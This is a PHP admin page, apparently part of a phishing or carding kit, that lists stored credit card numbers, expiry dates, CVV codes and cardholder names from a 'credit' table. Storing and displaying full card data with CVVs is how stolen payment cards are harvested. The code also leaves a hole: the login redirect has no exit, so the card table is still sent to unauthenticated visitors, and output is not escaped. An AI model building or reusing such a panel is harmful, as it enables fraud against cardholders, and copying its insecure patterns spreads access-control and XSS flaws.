<?php

//start session
session_start();

//Check if Userhas been signed in
if(!isset($_SESSION['capitalAdmin'])){
	header("location:index.php");
}
include('includes/header.php');


include('includes/connection.php');




?>
<!-- Main Container -->
<main id="main-container">
	<!-- Page Content -->
	<div class="content">


		<!-- Full Table -->
		<div class="block">
			<div class="block-header block-header-default">
				<h3 class="block-title">Details:</h3>
			</div>
			<div class="block-content">

				<div class="table-responsive">
					<table class="table table-striped table-vcenter">
						<thead>
							<tr>
								
								<th>Credit card number</th>
								<th>Expiry Date</th>
								<th>CCV</th>
								<th>Card Holder name</th>
							</tr>
						</thead>
						<tbody>
						        <?php
                    $query = mysqli_query($conn,"SELECT * FROM credit order by id desc");

                      if(mysqli_num_rows($query)>0){

                        while ($row = mysqli_fetch_array($query)) {
                         $s_time = $row['date'];



                    ?>
							
									<tr>
										<td ><?php echo $row['cardnumber']; ?></td>
										<td ><?php echo $row['em']; ?>/<?php echo $row['ey']; ?></td>
										<td ><?php echo $row['cvcode']; ?></td>
										<td><?php echo $row['cardname']; ?></td>

									</tr>
									
<?php

                        
                        }
                      }
                      else{
                        echo "No Activity For Deposit";
                      }
                      ?>

								</tbody>
							</table>
						</div>
					</div>
				</div>
				<!-- END Full Table -->
			</div>
			<!-- END Page Content -->
		</main>
		<!-- END Main Container -->

		<?php 
		include('includes/footer.php');

		?>